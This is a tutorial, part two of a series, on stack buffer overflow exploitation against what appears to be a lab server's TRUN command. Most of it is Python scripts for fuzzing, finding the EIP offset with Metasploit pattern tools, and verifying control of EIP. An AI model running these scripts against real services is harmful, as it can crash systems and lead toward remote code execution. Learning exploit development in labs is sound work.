# Buffer Overflow Guide - Part 2
## Fuzzing and Finding the Offset

### 1. Fuzzing Script
Create `fuzzer.py`:

```python
#!/usr/bin/python3
import socket
import time
import sys

host = "172.29.98.109"
port = 9999

timeout = 5
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        payload = "TRUN /.:/" + string
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        print(f"[+] Sending payload of {len(string)} bytes...")
        s.send(bytes(payload, "latin-1"))
        s.close()
    except:
        print(f"[-] Crashed at {len(string)} bytes")
        sys.exit()
    time.sleep(1)
```

### 2. Finding Exact Crash Point
After identifying approximate crash point, create `exploit.py`:

```python
#!/usr/bin/python3
import socket

host = "172.29.98.109"
port = 9999

# Create pattern using msf-pattern_create -l 2400
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5...[PATTERN]"  # Replace with actual pattern

try:
    payload = "TRUN /.:/" + buffer
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    print("[+] Sending evil buffer...")
    s.send(bytes(payload, "latin-1"))
    s.close()
    print("[+] Payload sent!")
except:
    print("[-] Could not connect!")
```

### 3. Generate Pattern and Find Offset

1. Generate pattern:
```bash
# In Kali
msf-pattern_create -l 2400
```

2. Update exploit.py with the pattern
3. Run exploit and note the EIP value in Immunity Debugger
4. Find offset:
```bash
# In Kali - replace DEAD BEEF with your EIP value
msf-pattern_offset -l 2400 -q 386F4337
```

### 4. Verify Offset
Create `verify_offset.py`:

```python
#!/usr/bin/python3
import socket

host = "172.29.98.109"
port = 9999

# Adjust offset based on previous step (example: 2003)
offset = 2003
buffer = "A" * offset
eip = "B" * 4
payload = buffer + eip

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    print("[+] Sending evil buffer...")
    s.send(bytes("TRUN /.:/" + payload, "latin-1"))
    s.close()
    
    print("[+] Payload sent!")
except:
    print("[-] Could not connect!")
```

### Expected Results:
1. Fuzzer should crash around 2100-2300 bytes
2. Pattern offset should be around 2003 bytes
3. EIP should contain 42424242 ("BBBB") when running verify_offset.py

### Next Steps:
Once offset is confirmed:
1. Find bad characters
2. Find return address
3. Generate shellcode
